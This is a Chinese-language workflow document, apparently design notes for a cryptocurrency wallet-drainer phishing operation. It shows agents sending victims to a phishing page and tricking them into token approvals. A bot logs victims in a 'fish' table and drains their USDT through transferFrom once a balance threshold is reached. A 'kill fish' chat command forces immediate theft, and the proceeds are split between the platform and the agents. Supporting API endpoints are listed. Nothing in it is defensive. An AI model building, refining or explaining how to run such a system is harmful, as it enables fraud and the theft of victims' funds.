# 工作流程

## TRON 钱包授权流程

```
1. 代理生成链接 → 用户访问钓鱼页面
2. 用户 approve(合约地址, 金额) → 链上授权
3. bot.js 实时扫链 → 检测到 approve 事件
4. 地址写入 fish 表 → auth_status=1
5. bot.js 每 3 秒轮询 fish 表 → 余额 > 阈值
6. 调用合约 controlAndTransferToken → 转账
7. 按分润比例拆分 → 平台 + 代理
```

## 阈值与触发

| 条件 | 行为 |
|------|------|
| usdt_balance > threshold | 自动触发转账 |
| 代理发 "杀鱼 <地址>" | 阈值改为 0.000001，立即触发 |
| 代理发 "阈值 <地址> <值>" | 修改阈值 |
| 转账完成 | 阈值重置为 200，等待下次触发 |

## 分润逻辑

```
TRC 链:
  ├── (1 - share_profits) × 金额 → payment_address（平台）
  └── share_profits × 金额 → daili.payment_address（代理）

EVM 链: 100% → 0x_payment_address（平台）
```

## 合约交互

```
用户 approve(contractAddress, amount)
  → allowance[user][contract] = amount
  → owner 调用 contract.controlAndTransferToken(USDT, user, dest, amount)
  → USDT.transferFrom(user, dest, amount)
```

## API 端点

| 端点 | 用途 |
|------|------|
| POST /query-address | 查询地址是否在鱼苗库 |
| POST /browse-broadcast | 记录钱包浏览行为 |
| POST /agent-payment-address | 获取代理收款地址 |
| GET /payment-config | 获取支付配置 |
| POST /payment/trc20/verify | 验证 TRC20 交易 |
